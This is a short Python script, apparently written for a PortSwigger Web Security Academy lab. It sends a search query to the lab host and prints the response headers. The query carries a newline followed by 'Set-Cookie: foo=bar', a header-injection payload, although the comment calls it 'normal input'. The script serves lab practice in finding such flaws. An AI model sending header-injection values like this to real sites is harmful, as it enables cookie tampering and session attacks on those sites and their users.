import requests

site = '0adf008804156c88816c3ec3009e0076.web-security-academy.net'

def getHeadersFromSearch(search_term):
    resp = requests.get(f"https://{site}/?search={search_term}")
    for header in resp.headers.items():
        print(header)

# Run with normal input
getHeadersFromSearch("calizo\nSet-Cookie: foo=bar")